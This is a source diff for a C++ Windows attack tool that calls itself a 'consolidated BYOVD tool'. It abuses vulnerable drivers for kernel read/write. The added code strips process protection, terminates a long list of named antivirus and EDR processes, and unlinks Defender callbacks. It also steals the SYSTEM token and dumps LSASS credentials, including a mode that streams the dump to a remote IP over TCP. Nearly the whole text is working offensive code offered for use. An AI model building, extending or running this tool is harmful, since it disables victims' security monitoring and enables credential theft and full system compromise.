+    "SAVService.exe","SEDService.exe","SophosClean.exe","SophosHealth.exe",
+    "SophosLiveQueryService.exe","SophosMTR.exe","SophosNetFilter.exe",
+    "SophosNtpService.exe","SophosOsquery.exe","SophosUI.exe","SophosUpdateMgr.exe",
+    // Tanium
+    "TaniumClient.exe","TaniumCX.exe","tanclient.exe",
+    // ThreatLocker
+    "ThreatLockerConsent.exe","threatlockerservice.exe","threatlockertray.exe",
+    // Trend Micro
+    "coreFrameworkHost.exe","coreServiceShell.exe","NTRTScan.exe","ntrtscan.exe",
+    "OfcService.exe","PccNTMon.exe","TMBMSRV.exe","TmListen.exe","TmPfw.exe",
+    // Uptycs
+    "VectorAgent.exe","UptycsAgent.exe",
+    // WatchGuard
+    "wlcsservice.exe",
+    // Webroot
+    "WRSA.exe","WRSkyClient.exe","WRSVC.exe",
+    // Sysmon
+    "Sysmon.exe","Sysmon64.exe",
+    // Zscaler
+    "zlclient.exe",
     nullptr
 };
+
+// Count processes still alive (for verify after kill)
+static int CountRunning(const char* name) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return 0;
+    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
+    int count = 0;
+    if (Process32FirstW(snap, &pe)) do {
+        char nm[MAX_PATH]{};
+        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, nm, sizeof(nm), nullptr, nullptr);
+        if (_stricmp(nm, name) == 0) count++;
+    } while (Process32NextW(snap, &pe));
+    CloseHandle(snap);
+    return count;
+}
 
 static void KillEdrs() {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return;
     PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
-    int killed = 0;
+    int attempted = 0, killed = 0, denied = 0;
     if (Process32FirstW(snap, &pe)) do {
         char nm[MAX_PATH]{};
         WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, nm, sizeof(nm), nullptr, nullptr);
         for (int i = 0; kEdrProcs[i]; i++) {
             if (_stricmp(nm, kEdrProcs[i]) == 0) {
+                attempted++;
                 HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                 if (h) {
-                    if (TerminateProcess(h, 1))
-                        printf("[+] Killed %s (PID %lu)\n", pe.szExeFile, pe.th32ProcessID), killed++;
+                    if (TerminateProcess(h, 1)) {
+                        printf("[+] Killed %s (PID %lu)\n", nm, pe.th32ProcessID);
+                        killed++;
+                    } else {
+                        printf("[-] TerminateProcess %s (PID %lu) failed (%lu) - PPL strip may have failed\n",
+                               nm, pe.th32ProcessID, GetLastError());
+                        denied++;
+                    }
                     CloseHandle(h);
+                } else {
+                    printf("[-] OpenProcess %s (PID %lu) failed (%lu)\n",
+                           nm, pe.th32ProcessID, GetLastError());
+                    denied++;
                 }
             }
         }
     } while (Process32NextW(snap, &pe));
     CloseHandle(snap);
-    printf("[*] %d EDR process(es) killed\n", killed);
+    printf("[*] %d EDR process(es) attempted: %d killed, %d denied\n", attempted, killed, denied);
+    if (denied > 0)
+        printf("[!] %d kill(s) denied - PPL strip likely failed or HVCI active\n", denied);
+}
+
+// Kill specific PID: strip PPL then terminate
+static bool KillSpecificPid(QWORD sysEproc, DWORD pid) {
+    char nm[16]{};
+    QWORD ep = FindEprocessByPid(sysEproc, pid, nm);
+    if (ep) {
+        BYTE before = 0; KRead(ep + g_off.Protection, &before, 1);
+        if (before != 0) {
+            printf("[*] %s (PID %lu) Protection=0x%02X, stripping...\n", nm, pid, before);
+            BYTE zero = 0;
+            if (!KWrite(ep + g_off.Protection, &zero, 1)) {
+                printf("[-] KWrite Protection failed\n");
+            } else {
+                BYTE after = 0xFF; KRead(ep + g_off.Protection, &after, 1);
+                printf("[+] Protection cleared: 0x%02X -> 0x%02X\n", before, after);
+            }
+        }
+    } else {
+        printf("[!] PID %lu EPROCESS not found (may not have PPL)\n", pid);
+    }
+
+    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+    if (!h) { printf("[-] OpenProcess PID %lu failed (%lu)\n", pid, GetLastError()); return false; }
+    if (!TerminateProcess(h, 1)) {
+        printf("[-] TerminateProcess PID %lu failed (%lu)\n", pid, GetLastError());
+        CloseHandle(h);
+        return false;
+    }
+    CloseHandle(h);
+
+    Sleep(300);
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
+    bool still_alive = false;
+    if (snap != INVALID_HANDLE_VALUE) {
+        if (Process32FirstW(snap, &pe)) do {
+            if (pe.th32ProcessID == pid) { still_alive = true; break; }
+        } while (Process32NextW(snap, &pe));
+        CloseHandle(snap);
+    }
+    if (still_alive) {
+        printf("[-] PID %lu still alive after TerminateProcess\n", pid);
+        return false;
+    }
+    printf("[+] PID %lu terminated and confirmed dead\n", pid);
+    return true;
 }
 
 // ---------------------------------------------------------------------------
-// Decode (XOR undo, validate MDMP)
+// Decode (XOR undo)
 // ---------------------------------------------------------------------------
 static bool DecodeFile(const char* inPath, const char* outPath) {
     HANDLE f = CreateFileA(inPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
     if (f == INVALID_HANDLE_VALUE) { printf("[-] Open %s failed (%lu)\n", inPath, GetLastError()); return false; }
     DWORD sz = GetFileSize(f, nullptr);
-    if (sz == INVALID_FILE_SIZE) { CloseHandle(f); return false; }
     BYTE* buf = (BYTE*)VirtualAlloc(nullptr, sz, MEM_COMMIT, PAGE_READWRITE);
     DWORD got = 0;
-    if (!ReadFile(f, buf, sz, &got, nullptr) || got != sz) { CloseHandle(f); VirtualFree(buf, 0, MEM_RELEASE); return false; }
+    ReadFile(f, buf, sz, &got, nullptr);
     CloseHandle(f);
     for (DWORD i = 0; i < sz; i++) buf[i] ^= 0x55;
     if (sz >= 4 && buf[0]=='M' && buf[1]=='D' && buf[2]=='M' && buf[3]=='P')
@@ -1092,7 +1396,6 @@ static bool DecodeFile(const char* inPath, const char* outPath) {
     else
         printf("[!] MDMP signature not found\n");
     HANDLE o = CreateFileA(outPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-    if (o == INVALID_HANDLE_VALUE) { VirtualFree(buf, 0, MEM_RELEASE); return false; }
     DWORD w = 0;
     WriteFile(o, buf, sz, &w, nullptr);
     CloseHandle(o);
@@ -1102,7 +1405,7 @@ static bool DecodeFile(const char* inPath, const char* outPath) {
 }
 
 // ---------------------------------------------------------------------------
-// Test R/W (safe: only reads System EPROCESS, writes nothing)
+// Test R/W
 // ---------------------------------------------------------------------------
 static bool TestRw(QWORD sysEproc) {
     printf("[test] Reading System EPROCESS at 0x%llX\n", sysEproc);
@@ -1114,30 +1417,23 @@ static bool TestRw(QWORD sysEproc) {
     printf("[+] KRead OK. First 16 bytes: ");
     for (int i = 0; i < 16; i++) printf("%02X ", block[i]);
     printf("\n");
-
-    // Read ImageFileName of System (should be "System")
     BYTE name[16]{};
-    if (KRead(sysEproc + g_off.ImageFileName, name, 15)) {
+    if (KRead(sysEproc + g_off.ImageFileName, name, 15))
         printf("[+] System EPROCESS ImageFileName: %s\n", (char*)name);
-    }
-
-    // Read UniqueProcessId of System (should be 4)
     QWORD pid4 = KReadQword(sysEproc + g_off.UniqueProcessId);
     printf("[+] System PID from EPROCESS: %llu (expect 4)\n", pid4);
-
     printf("[+] R/W test PASSED\n");
     return true;
 }
 
 // ---------------------------------------------------------------------------
-// Driver init (open or drop+load)
+// Driver init
 // ---------------------------------------------------------------------------
 static bool InitProvider(const Config& cfg) {
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    g_NtLoadDriver   = (NtLoadDriver_t)  GetProcAddress(ntdll, "NtLoadDriver");
-    g_NtUnloadDriver = (NtUnloadDriver_t)GetProcAddress(ntdll, "NtUnloadDriver");
-
-    g_activeProvider = cfg.type;
+    HMODULE ntdll      = GetModuleHandleA("ntdll.dll");
+    g_NtLoadDriver     = (NtLoadDriver_t)  GetProcAddress(ntdll, "NtLoadDriver");
+    g_NtUnloadDriver   = (NtUnloadDriver_t)GetProcAddress(ntdll, "NtUnloadDriver");
+    g_activeProvider   = cfg.type;
 
     if (cfg.type == ProviderType::PdfwKrnl) {
         g_pdfwDev = CreateFileW(L"\\\\.\\Global\\PdFwKrnl",
@@ -1150,14 +1446,12 @@ static bool InitProvider(const Config& cfg) {
     }
 
     if (cfg.drvPath.empty()) {
-        printf("[-] --driver path required for this provider\n"); return false;
+        printf("[-] --driver path required\n"); return false;
     }
-
     if (!EnablePrivilege(SE_LOAD_DRIVER_NAME)) {
         printf("[-] SeLoadDriverPrivilege not available\n"); return false;
     }
 
-    // BiosTool
     std::wstring widePath = Utf8ToWide(cfg.drvPath);
     std::wstring dropped;
     if (!CopyDriverToTemp(widePath, dropped)) return false;
@@ -1173,15 +1467,29 @@ static bool InitProvider(const Config& cfg) {
         DeleteFileW(dropped.c_str());
         return false;
     }
-
-    // Wait briefly for device to appear
     Sleep(300);
 
+    if (cfg.type == ProviderType::Ktapi) {
+        g_ktapiDev = CreateFileW(L"\\\\.\\ktapi",
+            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+        if (g_ktapiDev == INVALID_HANDLE_VALUE) {
+            printf("[-] Cannot open \\\\.\\ktapi (%lu)\n", GetLastError()); return false;
+        }
+        printf("[+] ktapi device opened\n");
+        printf("[*] Bootstrapping CR3 via PML4 self-ref scan (may take a moment)...\n");
+        g_ktapiCr3 = Ktapi_FindCr3();
+        if (!g_ktapiCr3) {
+            printf("[-] CR3 bootstrap failed - ktapi VA->PA unavailable\n"); return false;
+        }
+        printf("[+] Kernel CR3: 0x%llX\n", g_ktapiCr3);
+        return true;
+    }
+
+    // BiosTool
     std::wstring devPath = L"\\\\.\\" + g_svcName;
     g_biostoolDev = CreateFileW(devPath.c_str(),
         GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
     if (g_biostoolDev == INVALID_HANDLE_VALUE) {
-        // Try standard name for BiosToolCommonDriver
         g_biostoolDev = CreateFileW(L"\\\\.\\BiosToolCommonDriver",
             GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
     }
@@ -1195,22 +1503,11 @@ static bool InitProvider(const Config& cfg) {
 }
 
 static void CleanupProvider() {
-    if (g_biostoolDev != INVALID_HANDLE_VALUE) {
-        CloseHandle(g_biostoolDev);
-        g_biostoolDev = INVALID_HANDLE_VALUE;
-    }
-    if (g_pdfwDev != INVALID_HANDLE_VALUE) {
-        CloseHandle(g_pdfwDev);
-        g_pdfwDev = INVALID_HANDLE_VALUE;
-    }
-    if (!g_regPath.empty()) {
-        UnloadDriverViaNt(g_regPath);
-        DeleteServiceKey(g_svcName);
-    }
-    if (!g_dropPath.empty()) {
-        Sleep(500);
-        DeleteFileW(g_dropPath.c_str());
-    }
+    if (g_biostoolDev != INVALID_HANDLE_VALUE) { CloseHandle(g_biostoolDev); g_biostoolDev = INVALID_HANDLE_VALUE; }
+    if (g_pdfwDev     != INVALID_HANDLE_VALUE) { CloseHandle(g_pdfwDev);     g_pdfwDev     = INVALID_HANDLE_VALUE; }
+    if (g_ktapiDev    != INVALID_HANDLE_VALUE) { CloseHandle(g_ktapiDev);    g_ktapiDev    = INVALID_HANDLE_VALUE; }
+    if (!g_regPath.empty()) { UnloadDriverViaNt(g_regPath); DeleteServiceKey(g_svcName); }
+    if (!g_dropPath.empty()) { Sleep(500); DeleteFileW(g_dropPath.c_str()); }
 }
 
 // ---------------------------------------------------------------------------
@@ -1218,23 +1515,34 @@ static void CleanupProvider() {
 // ---------------------------------------------------------------------------
 static void Usage(const char* prog) {
     printf(
-        "cascade - consolidated BYOVD tool (BiosToolCommonDriver + warp)\n\n"
+        "cascade - consolidated BYOVD tool (BiosToolCommonDriver / ktapi / warp)\n\n"
         "usage: %s [options]\n"
-        "  --driver PATH        path to vulnerable driver .sys (required unless pdfwkrnl)\n"
-        "  --driver-type TYPE   biostool (default), ktapi, pdfwkrnl\n"
-        "  --pid N              target PID (default: LSASS)\n"
-        "  --test-rw            test kernel R/W (read only, safe)\n"
-        "  --dry-run            resolve structures, write nothing\n"
-        "  --priv-esc           steal SYSTEM token for current PID (token hijack)\n"
-        "  --kill-edr           terminate known AV/EDR processes\n"
-        "  --dump --out PATH    strip PPL + dump LSASS to PATH (XOR-obfuscated)\n"
-        "  --dump-kernel --out PATH  kernel-direct LSASS scan via CR3 (no OpenProcess VM_READ)\n"
-        "  --patch-callbacks    zero out Defender ObCallback PreOperation (requires HVCI=OFF)\n"
-        "  --no-xor             write raw minidump (with --dump)\n"
-        "  --decode --in PATH --out PATH  undo XOR, validate MDMP\n"
-        "  --help\n\n"
-        "Safe by default: without --dump/--priv-esc/--kill-edr nothing is modified.\n",
-        prog);
+        "  --driver PATH          path to vulnerable driver .sys\n"
+        "  --driver-type TYPE     biostool (default), ktapi, pdfwkrnl\n"
+        "  --pid N                target PID (default: lsass)\n\n"
+        "Recon (read-only):\n"
+        "  --test-rw              verify kernel R/W works\n"
+        "  --dry-run              resolve structures, write nothing\n"
+        "  --list-callbacks       enumerate ObCallback registrations\n\n"
+        "PPL / token:\n"
+        "  --ppl-strip --pid N    remove PPL from specific PID\n"
+        "  --ppl-add   --pid N    add PPL (Protected/WinSystem) to PID\n"
+        "  --priv-esc  [--pid N]  steal SYSTEM token (default: self)\n\n"
+        "EDR kill:\n"
+        "  --kill-edr             strip PPL + terminate all known AV/EDR (%d entries)\n"
+        "  --kill-pid  --pid N    strip PPL + terminate specific PID\n\n"
+        "Callbacks:\n"
+        "  --patch-callbacks      unlink all ObCallback registrations\n\n"
+        "Dump:\n"
+        "  --dump-rpm  --out PATH    ReadProcessMemory dump (recommended)\n"
+        "  --dump-tcp  RECV_IP PORT  disk-free TCP streaming dump\n"
+        "  --dump-kernel --out PATH  CR3 physical read (no VM_READ handle)\n"
+        "  --dump --out PATH         [deprecated: use --dump-rpm] MiniDumpWriteDump\n"
+        "  --no-xor               raw output (with --dump)\n"
+        "  --decode --in P --out P  undo XOR, validate MDMP\n\n"
+        "Common:\n"
+        "  --help\n",
+        prog, []{ int n=0; for(const char**p=kEdrProcs;*p;p++) n++; return n; }());
 }
 
 int main(int argc, char** argv) {
@@ -1242,28 +1550,37 @@ int main(int argc, char** argv) {
     for (int i = 1; i < argc; i++) {
         std::string a = argv[i];
         auto next = [&]() -> const char* { return (i + 1 < argc) ? argv[++i] : ""; };
-        if (a == "--help" || a == "-h")      { Usage(argv[0]); return 0; }
-        else if (a == "--driver")            cfg.drvPath     = next();
-        else if (a == "--out")               cfg.outPath     = next();
-        else if (a == "--in")                cfg.inPath      = next();
-        else if (a == "--pid")               cfg.targetPid   = (DWORD)atol(next());
+        if (a == "--help" || a == "-h")         { Usage(argv[0]); return 0; }
+        else if (a == "--driver")               cfg.drvPath    = next();
+        else if (a == "--out")                  cfg.outPath    = next();
+        else if (a == "--in")                   cfg.inPath     = next();
+        else if (a == "--pid")                  cfg.targetPid  = (DWORD)atol(next());
         else if (a == "--driver-type") {
             std::string t = next();
-            if (t == "biostool")             cfg.type = ProviderType::BiosTool;
-            else if (t == "ktapi")           cfg.type = ProviderType::Ktapi;
-            else if (t == "pdfwkrnl")        cfg.type = ProviderType::PdfwKrnl;
+            if (t == "biostool")               cfg.type = ProviderType::BiosTool;
+            else if (t == "ktapi")             cfg.type = ProviderType::Ktapi;
+            else if (t == "pdfwkrnl")          cfg.type = ProviderType::PdfwKrnl;
             else { printf("[-] Unknown driver-type: %s\n", t.c_str()); return 2; }
         }
-        else if (a == "--dry-run")           cfg.dryRun    = true;
-        else if (a == "--test-rw")           cfg.testRw    = true;
-        else if (a == "--priv-esc")          cfg.doPrivEsc = true;
-        else if (a == "--kill-edr")          cfg.killEdr   = true;
-        else if (a == "--dump")              cfg.doDump       = true;
-        else if (a == "--dump-rpm")          cfg.doDumpRpm    = true;
-        else if (a == "--dump-kernel")        cfg.doDumpKernel     = true;
-        else if (a == "--patch-callbacks")   cfg.doPatchCallbacks = true;
-        else if (a == "--decode")            cfg.doDecode     = true;
-        else if (a == "--no-xor")            cfg.noXor        = true;
+        else if (a == "--dry-run")              cfg.dryRun           = true;
+        else if (a == "--test-rw")              cfg.testRw           = true;
+        else if (a == "--priv-esc")             cfg.doPrivEsc        = true;
+        else if (a == "--kill-edr")             cfg.killEdr          = true;
+        else if (a == "--kill-pid")             cfg.doKillPid        = true;
+        else if (a == "--ppl-strip")            cfg.doPplStrip       = true;
+        else if (a == "--ppl-add")              cfg.doPplAdd         = true;
+        else if (a == "--dump")                 cfg.doDump           = true;
+        else if (a == "--dump-rpm")             cfg.doDumpRpm        = true;
+        else if (a == "--dump-kernel")          cfg.doDumpKernel     = true;
+        else if (a == "--dump-tcp") {
+            cfg.doDumpTcp = true;
+            cfg.recvIp    = next();
+            cfg.recvPort  = atoi(next());
+        }
+        else if (a == "--patch-callbacks")      cfg.doPatchCallbacks = true;
+        else if (a == "--list-callbacks")       cfg.doListCallbacks  = true;
+        else if (a == "--decode")               cfg.doDecode         = true;
+        else if (a == "--no-xor")               cfg.noXor            = true;
         else { printf("[-] Unknown arg: %s\n", a.c_str()); Usage(argv[0]); return 2; }
     }
 
@@ -1274,15 +1591,12 @@ int main(int argc, char** argv) {
         return DecodeFile(cfg.inPath.c_str(), cfg.outPath.c_str()) ? 0 : 1;
     }
 
-    // Resolve build and offsets
     DWORD build = GetWindowsBuild();
     printf("[*] Windows build: %lu\n", build);
     SetOffsetsByBuild(build);
 
-    // Load provider
     if (!InitProvider(cfg)) return 1;
 
-    // Get kernel base + System EPROCESS
     KernelBase kb = GetKernelBase();
     if (!kb.ntosBase || !kb.systemEproc) {
         printf("[-] Failed to locate ntoskrnl base or System EPROCESS\n");
@@ -1298,15 +1612,66 @@ int main(int argc, char** argv) {
         CleanupProvider(); return ret;
     }
 
-    // Resolve target PID
+    if (cfg.doListCallbacks) {
+        if (!ListCallbacks(kb.ntosBase)) ret = 1;
+    }
+
+    // Resolve LSASS PID for dump modes
     DWORD pid = cfg.targetPid;
-    if (!pid && (cfg.doDump || cfg.dryRun)) {
+    if (!pid && (cfg.doDump || cfg.doDumpRpm || cfg.doDumpKernel ||
+                 cfg.doDumpTcp || cfg.dryRun)) {
         pid = FindPidByName("lsass.exe");
         if (!pid) { printf("[-] Cannot find lsass.exe; use --pid\n"); CleanupProvider(); return 1; }
         printf("[*] LSASS PID: %lu\n", pid);
     }
 
-    if (cfg.killEdr) KillEdrs();
+    if (cfg.doPplStrip) {
+        DWORD tpid = cfg.targetPid;
+        if (!tpid) { printf("[-] --ppl-strip requires --pid\n"); CleanupProvider(); return 2; }
+        PplResult r = StripPpl(kb.systemEproc, tpid, false);
+        if (!r.ok) ret = 1;
+    }
+
+    if (cfg.doPplAdd) {
+        DWORD tpid = cfg.targetPid;
+        if (!tpid) { printf("[-] --ppl-add requires --pid\n"); CleanupProvider(); return 2; }
+        if (!PplAdd(kb.systemEproc, tpid)) ret = 1;
+    }
+
+    if (cfg.killEdr) {
+        printf("[*] Patching ObCallbacks before EDR kill...\n");
+        PatchObCallbacks(kb.ntosBase);
+        // Walk EPROCESS list for PPL processes and strip all
+        printf("[*] Stripping PPL from all running processes...\n");
+        QWORD head  = kb.systemEproc + g_off.ActiveProcessLinks;
+        QWORD flink = KReadQword(head);
+        int stripped = 0;
+        int guard = 0;
+        while (flink && flink != head && guard++ < 10000) {
+            QWORD ep = flink - g_off.ActiveProcessLinks;
+            BYTE prot = 0;
+            KRead(ep + g_off.Protection, &prot, 1);
+            if (prot > 0) {
+                char nm[16]{};
+                KRead(ep + g_off.ImageFileName, nm, 15);
+                BYTE zero = 0;
+                if (KWrite(ep + g_off.Protection, &zero, 1)) {
+                    BYTE verify = 0xFF; KRead(ep + g_off.Protection, &verify, 1);
+                    printf("[+] PPL stripped: %-20s Protection 0x%02X -> 0x%02X\n", nm, prot, verify);
+                    stripped++;
+                }
+            }
+            flink = KReadQword(ep + g_off.ActiveProcessLinks);
+        }
+        printf("[*] %d PPL processes stripped\n", stripped);
+        KillEdrs();
+    }
+
+    if (cfg.doKillPid) {
+        DWORD tpid = cfg.targetPid;
+        if (!tpid) { printf("[-] --kill-pid requires --pid\n"); CleanupProvider(); return 2; }
+        if (!KillSpecificPid(kb.systemEproc, tpid)) ret = 1;
+    }
 
     if (cfg.doPatchCallbacks) {
         printf("[*] Patching Defender ObCallback registrations...\n");
@@ -1314,75 +1679,62 @@ int main(int argc, char** argv) {
     }
 
     if (cfg.doPrivEsc) {
-        DWORD myPid = GetCurrentProcessId();
-        printf("[*] Stealing SYSTEM token for PID %lu (self)\n", myPid);
-        if (!TokenSteal(kb.systemEproc, myPid)) ret = 1;
+        DWORD tpid = cfg.targetPid ? cfg.targetPid : GetCurrentProcessId();
+        printf("[*] Stealing SYSTEM token for PID %lu%s\n",
+               tpid, cfg.targetPid ? "" : " (self)");
+        if (!TokenSteal(kb.systemEproc, tpid)) ret = 1;
     }
 
     if (cfg.dryRun) {
-        if (!pid) { printf("[-] --dry-run requires a target PID (use --pid or implicit LSASS)\n"); CleanupProvider(); return 2; }
-        PplResult r = StripPpl(kb.systemEproc, pid, /*dryRun=*/true);
+        if (!pid) { printf("[-] --dry-run requires target PID\n"); CleanupProvider(); return 2; }
+        PplResult r = StripPpl(kb.systemEproc, pid, true);
         if (!r.ok) ret = 1;
-        else printf("\n[dry-run] OK. Run with --dump --out <path> to execute.\n");
+        else printf("\n[dry-run] OK. Run with --dump-rpm --out <path> to execute.\n");
     }
 
     if (cfg.doDump) {
         if (cfg.outPath.empty()) { printf("[-] --dump needs --out\n"); CleanupProvider(); return 2; }
-        // Auto-patch ObCallbacks so OpenProcess gets PROCESS_ALL_ACCESS on LSASS
         printf("[*] Auto-patching ObCallbacks for dump...\n");
         PatchObCallbacks(kb.ntosBase);
-        PplResult r = StripPpl(kb.systemEproc, pid, /*dryRun=*/false);
+        // Read current protection state before clearing
+        QWORD lsassEp = FindEprocessByPid(kb.systemEproc, pid, nullptr);
+        BYTE savedProt = 0, savedSig = 0, savedSecSig = 0;
+        if (lsassEp) {
+            KRead(lsassEp + g_off.Protection - 2, &savedSig,    1);
+            KRead(lsassEp + g_off.Protection - 1, &savedSecSig, 1);
+            KRead(lsassEp + g_off.Protection,     &savedProt,   1);
+        }
+        PplResult r = StripPpl(kb.systemEproc, pid, false, true);
         if (!r.ok) { CleanupProvider(); return 1; }
-        if (!DumpLsass(pid, cfg.outPath.c_str(), cfg.noXor)) ret = 1;
+        bool ok = DumpLsass(pid, cfg.outPath.c_str(), cfg.noXor);
+        // Restore protection
+        if (lsassEp && savedProt) RestorePpl(lsassEp, savedProt, savedSig, savedSecSig);
+        if (!ok) ret = 1;
     }
 
     if (cfg.doDumpRpm) {
         if (cfg.outPath.empty()) { printf("[-] --dump-rpm needs --out\n"); CleanupProvider(); return 2; }
-        DWORD rpid = pid;
-        if (!rpid) { rpid = FindPidByName("lsass.exe"); printf("[*] LSASS PID: %lu\n", rpid); }
-        // Patch Process ObCallbacks so OpenProcess(VM_READ) gets access
+        DWORD rpid = pid ? pid : FindPidByName("lsass.exe");
+        if (!rpid) { printf("[-] Cannot find lsass.exe\n"); CleanupProvider(); return 1; }
         printf("[*] Auto-patching ObCallbacks for RPM dump...\n");
         PatchObCallbacks(kb.ntosBase);
         if (!DumpRpm(rpid, cfg.outPath.c_str())) ret = 1;
     }
 
+    if (cfg.doDumpTcp) {
+        if (cfg.recvIp.empty()) { printf("[-] --dump-tcp needs RECV_IP PORT\n"); CleanupProvider(); return 2; }
+        DWORD rpid = pid ? pid : FindPidByName("lsass.exe");
+        if (!rpid) { printf("[-] Cannot find lsass.exe\n"); CleanupProvider(); return 1; }
+        printf("[*] Auto-patching ObCallbacks for TCP dump...\n");
+        PatchObCallbacks(kb.ntosBase);
+        if (!DumpRpmTcp(rpid, cfg.recvIp.c_str(), cfg.recvPort)) ret = 1;
+    }
+
     if (cfg.doDumpKernel) {
         if (cfg.outPath.empty()) { printf("[-] --dump-kernel needs --out\n"); CleanupProvider(); return 2; }
-        DWORD kpid = pid;
-        if (!kpid) {
-            kpid = FindPidByName("lsass.exe");
-            if (!kpid) { printf("[-] Cannot find lsass.exe; use --pid\n"); CleanupProvider(); return 1; }
-            printf("[*] LSASS PID: %lu\n", kpid);
-        }
-        char nm[16]{};
-        QWORD lsassEp = FindEprocessByPid(kb.systemEproc, kpid, nm);
-        if (!lsassEp) { printf("[-] LSASS EPROCESS not found\n"); CleanupProvider(); return 1; }
-        // KPROCESS.DirectoryTableBase is stable at offset 0x28 across all modern Windows builds
-        QWORD cr3 = KReadQword(lsassEp + 0x28);
-        printf("[*] LSASS EPROCESS: 0x%llX  CR3: 0x%llX\n", lsassEp, cr3);
-        if (!cr3) { printf("[-] CR3 read returned 0 -- kernel R/W may not be working\n"); CleanupProvider(); return 1; }
-
-        // Find user-mode CR3: with KPTI the kernel CR3 (DirectoryTableBase@0x28) has
-        // PML4[0]=0 (user-mode not mapped). Try known UserDirectoryTableBase offsets
-        // until we find one whose PML4[0] is non-zero (user-mode mapped).
-        static const DWORD ucrOffsets[] = { 0x388, 0x280, 0x3B8, 0x028 };
-        QWORD useCr3 = cr3;
-        for (DWORD off : ucrOffsets) {
-            QWORD cand = KReadQword(lsassEp + off);
-            if (!cand || cand == cr3) continue;
-            QWORD candBase = cand & ~0xFFFULL;
-            QWORD pml4_0 = 0;
-            if (BiosTool_ReadPhys((PVOID)candBase, 8, &pml4_0) && (pml4_0 & 1)) {
-                printf("[*] UserDirectoryTableBase @ 0x%X = 0x%llX (PML4[0]=0x%llX - user-mode mapped)\n", off, cand, pml4_0);
-                useCr3 = cand;
-                break;
-            } else {
-                printf("[*] Tried offset 0x%X = 0x%llX: PML4[0]=0x%llX (not suitable)\n", off, cand, pml4_0);
-            }
-        }
-        if (useCr3 == cr3) printf("[!] Using kernel CR3 (user CR3 not found) - scan may miss user-mode pages\n");
-
-        if (!ScanLsassWDigest(lsassEp, useCr3, cfg.outPath.c_str())) ret = 1;
+        DWORD kpid = pid ? pid : FindPidByName("lsass.exe");
+        if (!kpid) { printf("[-] Cannot find lsass.exe\n"); CleanupProvider(); return 1; }
+        if (!DumpKernel(kb.systemEproc, kpid, cfg.outPath.c_str())) ret = 1;
     }
 
     CleanupProvider();
